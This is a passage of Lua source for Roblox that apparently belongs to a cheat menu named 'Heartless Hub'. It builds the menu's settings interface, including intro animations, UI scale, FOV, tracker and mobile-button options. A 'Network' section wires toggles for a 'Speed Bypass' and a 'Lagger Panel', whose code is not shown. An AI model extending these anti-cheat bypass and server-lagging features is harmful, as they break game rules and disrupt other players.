                        t.Position = UDim2.fromScale(0, 0.15)
                        t.BackgroundTransparency = 1
                        t.Text = "WAVE"
                        t.TextColor3 = WHITE
                        t.Font = Enum.Font.GothamBlack
                        t.TextSize = 22
                        t.ZIndex = 7
                        local t0 = tick()
                        while previewToken == my and layer.Parent and (tick()-t0) < 1.8 do
                            for i, b in ipairs(bars) do
                                local h = 12 + math.abs(math.sin((tick()-t0)*4 + i*0.5)) * 50
                                b.Size = UDim2.fromOffset(8, h)
                            end
                            task.wait(0.03)
                        end
                    elseif style == 3 then
                        -- HORIZON SPLIT (NOT rings)
                        layer.BackgroundColor3 = BLACK
                        local left = Instance.new("Frame", layer)
                        left.Size = UDim2.fromScale(0.5, 1)
                        left.Position = UDim2.fromScale(-0.5, 0)
                        left.BackgroundColor3 = ACC
                        left.BorderSizePixel = 0
                        left.ZIndex = 6
                        local right = Instance.new("Frame", layer)
                        right.Size = UDim2.fromScale(0.5, 1)
                        right.Position = UDim2.fromScale(1, 0)
                        right.BackgroundColor3 = Color3.fromRGB(12, 14, 22)
                        right.BorderSizePixel = 0
                        right.ZIndex = 6
                        tw(left, 0.45, {Position = UDim2.fromScale(0, 0)})
                        tw(right, 0.45, {Position = UDim2.fromScale(0.5, 0)})
                        task.wait(0.4)
                        local mid = Instance.new("Frame", layer)
                        mid.AnchorPoint = Vector2.new(0.5, 0.5)
                        mid.Position = UDim2.fromScale(0.5, 0.5)
                        mid.Size = UDim2.fromOffset(3, 0)
                        mid.BackgroundColor3 = WHITE
                        mid.BorderSizePixel = 0
                        mid.ZIndex = 8
                        tw(mid, 0.3, {Size = UDim2.fromOffset(3, 70)})
                        local t = Instance.new("TextLabel", layer)
                        t.Size = UDim2.fromScale(1, 1)
                        t.BackgroundTransparency = 1
                        t.Text = "HORIZON"
                        t.TextColor3 = WHITE
                        t.Font = Enum.Font.GothamBlack
                        t.TextSize = 18
                        t.TextTransparency = 1
                        t.ZIndex = 10
                        tw(t, 0.3, {TextTransparency = 0})
                        task.wait(1.2)
                    elseif style == 4 then
                        -- GLITCH typewriter
                        layer.BackgroundColor3 = Color3.fromRGB(2, 10, 6)
                        for i = 1, 8 do
                            local col = Instance.new("TextLabel", layer)
                            col.Size = UDim2.new(0, 12, 1, 0)
                            col.Position = UDim2.fromScale((i-1)/8, -0.3)
                            col.BackgroundTransparency = 1
                            col.Text = "01\n10\n11\n00"
                            col.TextColor3 = ACC
                            col.TextTransparency = 0.5
                            col.Font = Enum.Font.Code
                            col.TextSize = 9
                            col.ZIndex = 5
                            tw(col, 1.5, {Position = UDim2.fromScale((i-1)/8, 1.1)}, Enum.EasingStyle.Linear)
                        end
                        local t = Instance.new("TextLabel", layer)
                        t.Size = UDim2.fromScale(1, 1)
                        t.BackgroundTransparency = 1
                        t.Text = ""
                        t.TextColor3 = WHITE
                        t.Font = Enum.Font.GothamBlack
                        t.TextSize = 20
                        t.ZIndex = 10
                        local full = "Heartless Hub"
                        local junk = {"#","$","%","@","O","C","E","A","N"}
                        for step = 1, #full + 5 do
                            if previewToken ~= my or not layer.Parent then break end
                            local out = ""
                            for j = 1, #full do
                                if j < step - 1 then out = out .. full:sub(j,j)
                                else out = out .. junk[math.random(1,#junk)] end
                            end
                            t.Text = out
                            task.wait(0.08)
                        end
                        if t.Parent then t.Text = "GLITCH" end
                        task.wait(0.9)
                    elseif style == 5 then
                        -- RADAR
                        layer.BackgroundColor3 = Color3.fromRGB(6, 10, 16)
                        local radar = Instance.new("Frame", layer)
                        radar.AnchorPoint = Vector2.new(0.5, 0.5)
                        radar.Position = UDim2.fromScale(0.5, 0.48)
                        radar.Size = UDim2.fromOffset(90, 90)
                        radar.BackgroundTransparency = 1
                        radar.ZIndex = 6
                        for r = 1, 3 do
                            local ring = Instance.new("Frame", radar)
                            ring.AnchorPoint = Vector2.new(0.5, 0.5)
                            ring.Position = UDim2.fromScale(0.5, 0.5)
                            ring.Size = UDim2.fromOffset(20 + r * 22, 20 + r * 22)
                            ring.BackgroundTransparency = 1
                            Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
                            local st = Instance.new("UIStroke", ring)
                            st.Color = ACC
                            st.Thickness = 1
                            st.Transparency = 0.3
                        end
                        local beam = Instance.new("Frame", radar)
                        beam.AnchorPoint = Vector2.new(0.5, 1)
                        beam.Position = UDim2.fromScale(0.5, 0.5)
                        beam.Size = UDim2.fromOffset(2, 42)
                        beam.BackgroundColor3 = WHITE
                        beam.BorderSizePixel = 0
                        beam.ZIndex = 8
                        local lab = Instance.new("TextLabel", layer)
                        lab.Size = UDim2.new(1, 0, 0, 18)
                        lab.Position = UDim2.new(0, 0, 1, -22)
                        lab.BackgroundTransparency = 1
                        lab.Text = "RADAR"
                        lab.TextColor3 = WHITE
                        lab.Font = Enum.Font.GothamBlack
                        lab.TextSize = 12
                        lab.ZIndex = 10
                        local t0 = tick()
                        while previewToken == my and layer.Parent and (tick()-t0) < 1.8 do
                            beam.Rotation = (tick()-t0) * 140
                            task.wait(0.03)
                        end
                    else
                        -- CURTAIN (style 6)
                        layer.BackgroundColor3 = ACC
                        local top = Instance.new("Frame", layer)
                        top.Size = UDim2.fromScale(1, 0.5)
                        top.BackgroundColor3 = BLACK
                        top.BorderSizePixel = 0
                        top.ZIndex = 8
                        local bot = Instance.new("Frame", layer)
                        bot.Size = UDim2.fromScale(1, 0.5)
                        bot.Position = UDim2.fromScale(0, 0.5)
                        bot.BackgroundColor3 = BLACK
                        bot.BorderSizePixel = 0
                        bot.ZIndex = 8
                        local chrome = Instance.new("Frame", layer)
                        chrome.AnchorPoint = Vector2.new(0.5, 0.5)
                        chrome.Position = UDim2.fromScale(0.5, 0.5)
                        chrome.Size = UDim2.new(1, 0, 0, 4)
                        chrome.BackgroundColor3 = WHITE
                        chrome.BorderSizePixel = 0
                        chrome.ZIndex = 9
                        local lab = Instance.new("TextLabel", layer)
                        lab.Size = UDim2.fromScale(1, 1)
                        lab.BackgroundTransparency = 1
                        lab.Text = "CURTAIN"
                        lab.TextColor3 = WHITE
                        lab.TextTransparency = 1
                        lab.Font = Enum.Font.GothamBlack
                        lab.TextSize = 18
                        lab.ZIndex = 6
                        task.wait(0.25)
                        tw(top, 0.5, {Position = UDim2.fromScale(0, -0.55)})
                        tw(bot, 0.5, {Position = UDim2.fromScale(0, 1.05)})
                        tw(chrome, 0.35, {BackgroundTransparency = 1, Size = UDim2.fromOffset(0, 4)})
                        task.wait(0.35)
                        tw(lab, 0.3, {TextTransparency = 0})
                        task.wait(1.0)
                    end
                    if previewToken == my and layer.Parent then
                        tw(layer, 0.3, {BackgroundTransparency = 1})
                        task.wait(0.35)
                        if layer.Parent then layer:Destroy() end
                    end
                end)
            end

            for i = 1, 6 do
                local b = new("TextButton",{
                    Parent=rowI, Size=UDim2.fromOffset(52,26), BackgroundColor3=Color3.fromRGB(18,18,18),
                    Text=tostring(i), Font=Enum.Font.GothamBold, TextSize=10,
                    TextColor3=Color3.fromRGB(200,200,200), AutoButtonColor=false, BorderSizePixel=0, LayoutOrder=i,
                },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
                btns[i] = b
                b.MouseButton1Click:Connect(function()
                    introStyle = i
                    for j, bb in pairs(btns) do
                        local on = (j == i)
                        bb.BackgroundColor3 = on and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                        bb.TextColor3 = on and accentTextColor(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                    end
                    runPreview(i)
                    saveConfig()
                end)
            end
            local function paintIntroBtns()
                local s = math.clamp(tonumber(introStyle) or 1, 1, 6)
                for j, bb in pairs(btns) do
                    local on = (j == s)
                    bb.BackgroundColor3 = on and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    bb.TextColor3 = on and accentTextColor(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
            end
            onAccent(function() paintIntroBtns() end, rowI)
            paintIntroBtns()

            -- tablet frame
            local tabRow = row(140)
            tabRow.Parent = parent
            tablet = new("Frame",{
                Parent=tabRow,
                Size=UDim2.new(1,-16,0,128),
                Position=UDim2.fromOffset(8,4),
                BackgroundColor3=Color3.fromRGB(10,12,18),
                BorderSizePixel=0,
            },{corner(14), stroke(ACCENT_COLOR,1.8,0.25)})
            local bezel = new("Frame",{
                Parent=tablet, AnchorPoint=Vector2.new(0.5,0), Position=UDim2.new(0.5,0,0,6),
                Size=UDim2.new(0.92,0,0,4), BackgroundColor3=Color3.fromRGB(40,40,48), BorderSizePixel=0,
            },{corner(2)})
            local placeholder = new("TextLabel",{
                Parent=tablet, Size=UDim2.fromScale(1,1), BackgroundTransparency=1,
                Text="TAP INTRO 1 / 2 / 3\nHeartless Hub preview plays here",
                TextColor3=Color3.fromRGB(140,140,150), Font=Enum.Font.Gotham, TextSize=11,
                TextYAlignment=Enum.TextYAlignment.Center, ZIndex=3,
            })
            -- auto preview current on open
            task.defer(function()
                task.wait(0.15)
                runPreview(math.clamp(tonumber(introStyle) or 1, 1, 3))
            end)
        end

        sectionLabel("Custom Background").Parent = parent
        do
            local bgRow = row(52)
            bgRow.Parent = parent
            local placeholder = "Asset ID only"
            local showText = (customBgId and customBgId ~= "" and customBgId) or placeholder
            local bgBox = new("TextBox",{
                Parent=bgRow,
                Size=UDim2.new(1,-24,0,30),
                Position=UDim2.fromOffset(12,11),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text=showText,
                PlaceholderText=placeholder,
                Font=Enum.Font.Gotham,
                TextSize=11,
                TextColor3=Color3.fromRGB(220,220,230),
                PlaceholderColor3=Color3.fromRGB(100,100,110),
                ClearTextOnFocus=true,
                BorderSizePixel=0,
                TextXAlignment=Enum.TextXAlignment.Center,
            },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.3)})
            bgBox.Focused:Connect(function()
                if bgBox.Text == placeholder then bgBox.Text = "" end
            end)
            bgBox.FocusLost:Connect(function()
                local raw = (bgBox.Text or ""):gsub("%s+",""):gsub("rbxassetid://","")
                if raw == "" or not raw:match("^%d+$") then
                    customBgId = ""
                    bgBox.Text = placeholder
                else
                    customBgId = raw
                    bgBox.Text = raw
                end
                if applyThemeBackground then applyThemeBackground() end
                saveConfig()
            end)
        end

        
        makeToggle("Anti Lag", antiLagEnabled, nil, function(on)
            if on then enableAntiLag() else disableAntiLag() end
            saveConfig()
        end).Parent = parent
        makeToggle("Stretch Rez", stretchRezEnabled, nil, function(on)
            if on then enableStretchRez() else disableStretchRez() end
            saveConfig()
        end).Parent = parent
        makeToggle("Ragdoll GUI", ragdollGuiEnabled, nil, function(on)
            ragdollGuiEnabled=on
            saveConfig()
        end).Parent = parent
        do
            local container = new("Frame",{
                Size=UDim2.new(1,0,0,90),
                BackgroundTransparency=1,
                BorderSizePixel=0,
            })
            container.Parent = parent
            new("UIListLayout",{Parent=container,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,4)})
            local labelRow = row(24)
            labelRow.Parent = container
            labelRow.LayoutOrder = 1
            new("TextLabel",{
                Parent=labelRow,
                Size=UDim2.new(1,-14,1,0),
                Position=UDim2.fromOffset(14,0),
                BackgroundTransparency=1,
                Text="Ragdoll Timer Position",
                Font=Enum.Font.GothamMedium,
                TextSize=13,
                TextColor3=Color3.fromRGB(235,235,235),
                TextXAlignment=Enum.TextXAlignment.Left,
            })
            local btnRow = row(30)
            btnRow.Parent = container
            btnRow.LayoutOrder = 2
            new("UIListLayout",{Parent=btnRow,FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder})
            local function mkPosBtn(txt, order)
                return new("TextButton",{
                    Parent=btnRow,
                    Size=UDim2.fromOffset(70,26),
                    BackgroundColor3=Color3.fromRGB(18,18,18),
                    Text=txt,
                    Font=Enum.Font.GothamBold,
                    TextSize=11,
                    TextColor3=Color3.fromRGB(200,200,200),
                    AutoButtonColor=false,
                    BorderSizePixel=0,
                    LayoutOrder=order,
                },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            end
            local upB = mkPosBtn("UP", 1)
            local underB = new("TextButton",{
                Parent=btnRow,
                Size=UDim2.fromOffset(110,26),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text="UNDER SPEED",
                Font=Enum.Font.GothamBold,
                TextSize=10,
                TextColor3=Color3.fromRGB(200,200,200),
                AutoButtonColor=false,
                BorderSizePixel=0,
                LayoutOrder=2,
            },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            local hint = new("TextLabel",{
                Parent=container,
                Size=UDim2.new(1,-14,0,16),
                BackgroundTransparency=1,
                Text="UP = fixed screen  ·  UNDER SPEED = follows you like speed",
                Font=Enum.Font.Gotham,
                TextSize=10,
                TextColor3=Color3.fromRGB(140,145,160),
                TextXAlignment=Enum.TextXAlignment.Left,
                LayoutOrder=3,
            })
            local function paintRagPos()
                local m = string.upper(tostring(ragdollGuiPos or "UP"))
                if m == "DOWN" then m = "UNDER_SPEED" end
                for _, pair in ipairs({{upB,"UP"},{underB,"UNDER_SPEED"}}) do
                    local b, name = pair[1], pair[2]
                    local on = (m == name)
                    b.BackgroundColor3 = on and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    b.TextColor3 = on and accentTextColor(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
            end
            local function setRagPos(pos)
                ragdollGuiPos = pos
                paintRagPos()
                saveConfig()
            end
            upB.MouseButton1Click:Connect(function() setRagPos("UP") end)
            underB.MouseButton1Click:Connect(function() setRagPos("UNDER_SPEED") end)
            onAccent(function() paintRagPos() end, upB)
            paintRagPos()
        end


        sectionLabel("Network").Parent = parent
        makeToggle("Speed Bypass", bypassEnabled, nil, function(on)
            bypassEnabled = on == true
            if bypassEnabled then
                if startOceanBypass then pcall(startOceanBypass) end
            else
                if stopOceanBypass then pcall(stopOceanBypass) end
            end
            saveConfig()
        end).Parent = parent
        makeToggle("Lagger Panel", laggerPanelEnabled, nil, function(on)
            laggerPanelEnabled = on == true
            if laggerPanelEnabled then
                if startOceanLagger then pcall(startOceanLagger) end
            else
                if stopOceanLagger then pcall(stopOceanLagger) end
            end
            saveConfig()
        end).Parent = parent


        sectionLabel("UI Scale").Parent = parent
        local scaleRow = row(46)
        scaleRow.Parent = parent
        new("TextLabel",{Parent=scaleRow,Size=UDim2.new(1,-80,1,0),Position=UDim2.fromOffset(14,0),BackgroundTransparency=1,
            Text="Scale",Font=Enum.Font.GothamMedium,TextSize=14,TextColor3=Color3.fromRGB(235,235,235),TextXAlignment=Enum.TextXAlignment.Left})
        local scaleBox = new("TextBox",{Parent=scaleRow,Size=UDim2.fromOffset(58,26),Position=UDim2.new(1,-66,0.5,-13),
            BackgroundColor3=Color3.fromRGB(18,18,18),Text=tostring(math.floor(uiScaleValue*100)).."%",Font=Enum.Font.GothamBold,TextSize=13,
            TextColor3=Color3.fromRGB(235,235,235),TextXAlignment=Enum.TextXAlignment.Center,
            ClearTextOnFocus=true,BorderSizePixel=0},{corner(6)})
        scaleBox.FocusLost:Connect(function()
            local n = tonumber((scaleBox.Text):gsub("%%", ""))
            if n then
                n = math.clamp(n, 50, 150)
                setUIScale(n / 100)
                scaleBox.Text = tostring(n) .. "%"
                saveConfig()
            else
                scaleBox.Text = tostring(math.floor(uiScaleValue*100)) .. "%"
            end
        end)

        local scaleBtnRow = new("Frame",{
            Parent=parent,
            Size=UDim2.new(1,0,0,36),
            BackgroundTransparency=1,
            BorderSizePixel=0,
        })
        new("UIListLayout",{Parent=scaleBtnRow,FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),HorizontalAlignment=Enum.HorizontalAlignment.Center})
        local function makeScaleBtn(label, scaleVal)
            local b = new("TextButton",{
                Parent=scaleBtnRow,
                Size=UDim2.fromOffset(44,26),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text=label,
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(200,200,200),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(8), stroke(Color3.fromRGB(50,50,50),1,0.2)})
            b.MouseButton1Click:Connect(function()
                setUIScale(scaleVal)
                scaleBox.Text = tostring(math.floor(scaleVal * 100)) .. "%"
                saveConfig()
            end)
            return b
        end
        makeScaleBtn("50%", 0.5)
        makeScaleBtn("75%", 0.75)
        makeScaleBtn("100%", 1.0)
        makeScaleBtn("125%", 1.25)
        makeScaleBtn("150%", 1.5)

        sectionLabel("Sky Theme").Parent = parent
        local skyRow = row(46)
        skyRow.Parent = parent
        new("TextLabel",{Parent=skyRow,Size=UDim2.new(1,-80,1,0),Position=UDim2.fromOffset(14,0),BackgroundTransparency=1,
            Text="Sky Theme",Font=Enum.Font.GothamMedium,TextSize=14,TextColor3=Color3.fromRGB(235,235,235),TextXAlignment=Enum.TextXAlignment.Left})
        local skyBox = new("TextButton",{Parent=skyRow,Size=UDim2.fromOffset(80,26),Position=UDim2.new(1,-90,0.5,-13),
            BackgroundColor3=Color3.fromRGB(18,18,18),Text=currentSkyTheme,Font=Enum.Font.GothamBold,TextSize=12,
            TextColor3=Color3.fromRGB(235,235,235),BorderSizePixel=0},{corner(6)})
        local skyIdx = 1
        for i,t in ipairs(SkyOrder) do if t==currentSkyTheme then skyIdx=i;break end end
        skyBox.MouseButton1Click:Connect(function()
            skyIdx = skyIdx % #SkyOrder + 1
            currentSkyTheme = SkyOrder[skyIdx]
            skyBox.Text = currentSkyTheme
            CandyApplyCustomSky(currentSkyTheme)
            saveConfig()
        end)

        sectionLabel("FOV").Parent = parent
        local fovRow = row(46)
        fovRow.Parent = parent
        new("TextLabel",{Parent=fovRow,Size=UDim2.new(1,-80,1,0),Position=UDim2.fromOffset(14,0),BackgroundTransparency=1,
            Text="FOV",Font=Enum.Font.GothamMedium,TextSize=14,TextColor3=Color3.fromRGB(235,235,235),TextXAlignment=Enum.TextXAlignment.Left})
        local fovBox = new("TextButton",{Parent=fovRow,Size=UDim2.fromOffset(60,26),Position=UDim2.new(1,-70,0.5,-13),
            BackgroundColor3=Color3.fromRGB(18,18,18),Text=tostring(fovValue),Font=Enum.Font.GothamBold,TextSize=12,
            TextColor3=Color3.fromRGB(235,235,235),BorderSizePixel=0},{corner(6)})
        fovBox.MouseButton1Click:Connect(function()
            fovIndex = fovIndex % #fovOptions + 1
            fovValue = fovOptions[fovIndex]
            fovBox.Text = tostring(fovValue)
            applyFOV()
            saveConfig()
        end)

        sectionLabel("Bat Theme").Parent = parent
        do
            local batRow = row(46)
            batRow.Parent = parent
            local batBtn = new("TextButton",{
                Parent=batRow,
                Size=UDim2.new(1,-24,0,30),
                Position=UDim2.fromOffset(12,8),
                BackgroundColor3=ACCENT,
                Text="BAT THEMES",
                Font=Enum.Font.GothamBlack,
                TextSize=13,
                TextColor3=accentTextColor(ACCENT),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(8)})
            onAccent(function(a)
                batBtn.BackgroundColor3 = a
                batBtn.TextColor3 = accentTextColor(a)
            end, batBtn)
            batBtn.MouseButton1Click:Connect(function()
                if openBatThemesStudio then openBatThemesStudio() end
            end)
        end

        sectionLabel("TRACKER").Parent = parent
        makeToggle("Tracker", trackerEnabled, nil, function(on)
            if setTrackerEnabled then setTrackerEnabled(on) else trackerEnabled=on; if on and buildTracker then buildTracker() elseif destroyTracker then destroyTracker() end end
        end).Parent = parent
        do
            local rowT = row(30)
            rowT.Parent = parent
            new("UIListLayout",{Parent=rowT,FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder})
            local function mk(txt, order)
                return new("TextButton",{Parent=rowT,Size=UDim2.fromOffset(100,26),BackgroundColor3=Color3.fromRGB(18,18,18),
                    Text=txt,Font=Enum.Font.GothamBold,TextSize=10,TextColor3=Color3.fromRGB(200,200,200),
                    AutoButtonColor=false,BorderSizePixel=0,LayoutOrder=order},{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            end
            local kBtn,cBtn = mk("KEYBOARD",1), mk("CONTROLLER",2)
            local function paint()
                local m=tostring(trackerMode or "keyboard")
                for _,pair in ipairs({{kBtn,"keyboard"},{cBtn,"controller"}}) do
                    local b,name=pair[1],pair[2]
                    local on=(m==name)
                    b.BackgroundColor3=on and ACCENT or Color3.fromRGB(18,18,18)
                    b.TextColor3=on and accentTextColor(ACCENT) or Color3.fromRGB(200,200,200)
                end
            end
            kBtn.MouseButton1Click:Connect(function() trackerMode="keyboard"; paint(); if trackerEnabled and buildTracker then pcall(buildTracker) end; saveConfig() end)
            cBtn.MouseButton1Click:Connect(function() trackerMode="controller"; paint(); if trackerEnabled and buildTracker then pcall(buildTracker) end; saveConfig() end)
            onAccent(function() paint() end, kBtn)
            paint()
        end
        makeSlider("Tracker Size", 0.5, 2.0, trackerScale or 1, function(v)
            trackerScale=v
            if trackerEnabled and buildTracker then pcall(buildTracker) end
            saveConfig()
            saveConfig()
        end).Parent = parent

        makeToggle("Tracker BG", trackerBgEnabled, nil, function(on)
            trackerBgEnabled = on and true or false
            if trackerEnabled and buildTracker then pcall(buildTracker) end
            saveConfig()
        end).Parent = parent

        makeToggle("High Ping Warn", highPingWarnEnabled, nil, function(on)
            highPingWarnEnabled = on and true or false
            if highPingWarnEnabled then pcall(createHighPingWarn) else pcall(destroyHighPingWarn) end
            saveConfig()
        end).Parent = parent
        makeSlider("Ping Threshold", 80, 400, highPingThreshold or 150, function(v)
            highPingThreshold = math.floor(v)
            saveConfig()
        end).Parent = parent

        sectionLabel("Mobile Buttons").Parent = parent
        makeToggle("Show Mobile Buttons", mobileButtonsEnabled, nil, function(on)
            mobileButtonsEnabled = on
            buildMobileButtons()
            saveConfig()
        end).Parent = parent
        -- Panel vs Individual layout
        do
            local rowL = row(30)
            rowL.Parent = parent
            new("UIListLayout",{Parent=rowL,FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder})
            local function mk(txt, order)
                return new("TextButton",{
                    Parent=rowL, Size=UDim2.fromOffset(90,26), BackgroundColor3=Color3.fromRGB(18,18,18),
                    Text=txt, Font=Enum.Font.GothamBold, TextSize=11, TextColor3=Color3.fromRGB(200,200,200),
                    AutoButtonColor=false, BorderSizePixel=0, LayoutOrder=order,
                },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            end
            local panelB = mk("PANEL", 1)
            local indB = mk("INDIVIDUAL", 2)
            local function paintL()
                local m = tostring(mobileButtonsLayout or "panel"):lower()
                for _, pair in ipairs({{panelB,"panel"},{indB,"individual"}}) do
                    local b, name = pair[1], pair[2]
                    local on = (m == name)
                    b.BackgroundColor3 = on and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    b.TextColor3 = on and accentTextColor(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
            end
            local function setL(v)
                mobileButtonsLayout = v
                paintL()
                if buildMobileButtons then pcall(buildMobileButtons) end
                saveConfig()
            end
            panelB.MouseButton1Click:Connect(function() setL("panel") end)
            indB.MouseButton1Click:Connect(function() setL("individual") end)
            onAccent(function() paintL() end, panelB)
            paintL()
        end
        makeToggle("Lock Mobile Buttons", mobileButtonsLocked, nil, function(on)
            mobileButtonsLocked = on
            updateLockButton()
            -- rebuild so no stale drag state
            if buildMobileButtons and mobileButtonsEnabled then pcall(buildMobileButtons) end
            saveConfig()
        end).Parent = parent
        makeToggle("Per-Button Drag", perButtonDragEnabled, nil, function(on)
            perButtonDragEnabled = on
            saveConfig()
        end).Parent = parent

        sectionLabel("Button Shape").Parent = parent
        do
            local shapes = {"square", "rounded", "circle", "oval", "hexagon", "pentagon"}
            local labels = {square="Square", rounded="Rounded", circle="Circle", oval="Oval", hexagon="Hexagon", pentagon="Pentagon"}
            local shapeRow1 = row(36)
            shapeRow1.Parent = parent
            shapeRow1.ClipsDescendants = true
            local hold1 = new("Frame",{
                Parent=shapeRow1, Size=UDim2.new(1,-16,0,30), Position=UDim2.fromOffset(8,3),
                BackgroundTransparency=1, BorderSizePixel=0, ClipsDescendants=true,
            })
            local shapeRow2 = row(36)
            shapeRow2.Parent = parent
            shapeRow2.ClipsDescendants = true
            local hold2 = new("Frame",{
                Parent=shapeRow2, Size=UDim2.new(1,-16,0,30), Position=UDim2.fromOffset(8,3),
                BackgroundTransparency=1, BorderSizePixel=0, ClipsDescendants=true,
            })
            local function makeShapeBtn(parentFrame, shapeName, side)
                local on = (tostring(mobileButtonShape or "rounded"):lower() == shapeName)
                local b = new("TextButton",{
                    Parent=parentFrame,
                    Size=UDim2.new(1/3, -4, 1, 0),
                    Position=UDim2.new(side/3, side > 0 and 2 or 0, 0, 0),
                    BackgroundColor3 = on and ACCENT or Color3.fromRGB(16,16,20),
                    BackgroundTransparency = on and 0.05 or 0.2,
                    Text = labels[shapeName] or shapeName,
                    Font=Enum.Font.GothamBold,
                    TextSize=10,
                    TextColor3 = on and accentTextColor(ACCENT) or Color3.fromRGB(200,200,210),
                    AutoButtonColor=false,
                    BorderSizePixel=0,
                },{corner(8)})
                onAccent(function(a)
                    if tostring(mobileButtonShape or "rounded"):lower() == shapeName then
                        b.BackgroundColor3 = a
                        b.TextColor3 = accentTextColor(a)
                    end
                end, b)
                b.MouseButton1Click:Connect(function()
                    mobileButtonShape = shapeName
                    circleButtonsEnabled = (shapeName == "circle")
                    buildMobileButtons()
                    saveConfig()
                    if current == "Settings" and builders.Settings then
                        for _,c in ipairs(body:GetChildren()) do
                            if not c:IsA("UIPadding") and not c:IsA("UIListLayout") then c:Destroy() end
                        end
                        builders.Settings(body)
                    end
                end)
                return b
            end
            for i, s in ipairs({"square","rounded","circle"}) do
                makeShapeBtn(hold1, s, i-1)
            end
            for i, s in ipairs({"oval","hexagon","pentagon"}) do
                makeShapeBtn(hold2, s, i-1)
            end
        end

        local resetPosRow = row(46)
        resetPosRow.Parent = parent
        local resetPosBtn = new("TextButton",{
            Parent=resetPosRow,
            Size=UDim2.new(1,-24,0,30),
            Position=UDim2.fromOffset(12,8),
            BackgroundColor3=ACCENT,
            Text="RESET MOBILE POSITIONS",
            Font=Enum.Font.GothamBold,
            TextSize=12,
            TextColor3=accentTextColor(ACCENT),
            AutoButtonColor=false,
            BorderSizePixel=0,
        },{corner(8)})
        onAccent(function(a)
            resetPosBtn.BackgroundColor3 = a
            resetPosBtn.TextColor3 = accentTextColor(a)
        end, resetPosBtn)
        resetPosBtn.MouseButton1Click:Connect(function()
            if resetMobileButtonPositions then
                pcall(resetMobileButtonPositions)
            end
            resetPosBtn.Text = "RESET!"
            task.delay(1.0, function()
                if resetPosBtn and resetPosBtn.Parent then
                    resetPosBtn.Text = "RESET MOBILE POSITIONS"
                end
            end)
        end)

        local sizeRow = row(46)
        sizeRow.Parent = parent
        new("TextLabel",{Parent=sizeRow,Size=UDim2.new(1,-80,1,0),Position=UDim2.fromOffset(14,0),BackgroundTransparency=1,
            Text="Btn Size",Font=Enum.Font.GothamMedium,TextSize=14,TextColor3=Color3.fromRGB(235,235,235),TextXAlignment=Enum.TextXAlignment.Left})
        local sizeBox = new("TextBox",{Parent=sizeRow,Size=UDim2.fromOffset(58,26),Position=UDim2.new(1,-66,0.5,-13),
            BackgroundColor3=Color3.fromRGB(18,18,18),Text=tostring(mobileButtonsSize),Font=Enum.Font.GothamBold,TextSize=13,
            TextColor3=Color3.fromRGB(235,235,235),TextXAlignment=Enum.TextXAlignment.Center,
            ClearTextOnFocus=true,BorderSizePixel=0},{corner(6)})
        sizeBox.FocusLost:Connect(function()
            local n = tonumber(sizeBox.Text)
            if n then
                n = math.clamp(n, 50, 150)
                mobileButtonsSize = n
                sizeBox.Text = tostring(n)
                buildMobileButtons()
                saveConfig()
            else
                sizeBox.Text = tostring(mobileButtonsSize)
            end
        end)

    end

    local builders = {Speed=buildSpeed, Movement=buildMovement, Combat=buildCombat, Settings=buildSettings}
    local current
    local tabButtons = {}
    local tabIndicators = {}
    local sideChromeFolder = new("Folder", {Parent=main, Name="SideChrome"})

    local function selectTab(name)
        current = name
        ACCENT = ACCENT_COLOR
        for _,c in ipairs(body:GetChildren()) do
            if not c:IsA("UIPadding") and not c:IsA("UIListLayout") then c:Destroy() end
        end
        if builders[name] then builders[name](body) end
        local isCorner = (uiLayoutMode or 1) == 3 or (uiLayoutMode or 1) == 4
        for n,btn in pairs(tabButtons) do
            local active = n==name
            if isCorner then
                if type(n) == "string" and n ~= "" then
                    btn.Text = n
                end
                btn.TextTransparency = 0
                btn.Visible = true
                TweenService:Create(btn, TweenInfo.new(0.18), {
                    BackgroundColor3 = active and ACCENT_COLOR or Color3.fromRGB(16,18,26),
                    TextColor3 = active and accentTextColor(ACCENT_COLOR) or Color3.fromRGB(180,185,200),
                }):Play()
            else
                TweenService:Create(btn, TweenInfo.new(0.18), {
                    TextColor3 = active and accentTextColor(ACCENT_COLOR) or Color3.fromRGB(130,130,130)
                }):Play()
            end
            btn.Font = active and Enum.Font.GothamBold or Enum.Font.GothamMedium
            local ind = tabIndicators[n]
            if ind then
                ind.BackgroundColor3 = ACCENT_COLOR
                TweenService:Create(ind, TweenInfo.new(0.18), {
                    BackgroundTransparency = active and 0 or 1
                }):Play()
            end
        end
    end

    onAccent(function(a)
        if current and tabButtons[current] then
            tabButtons[current].TextColor3 = accentTextColor(a)
        end
        for n,ind in pairs(tabIndicators) do
            if ind and ind.Parent then
                ind.BackgroundColor3 = a
            end
        end
    end)

    local function makeSideTab(parent, name, index, total)
        local h = 1 / total
        local ind = new("Frame",{
            Parent=parent,
            Size=UDim2.new(1,-6,h,-6),
            Position=UDim2.new(0,3,h*(index-1),3),
            BackgroundColor3=ACCENT_COLOR,
            BackgroundTransparency=1,
            BorderSizePixel=0,
            ZIndex=1,
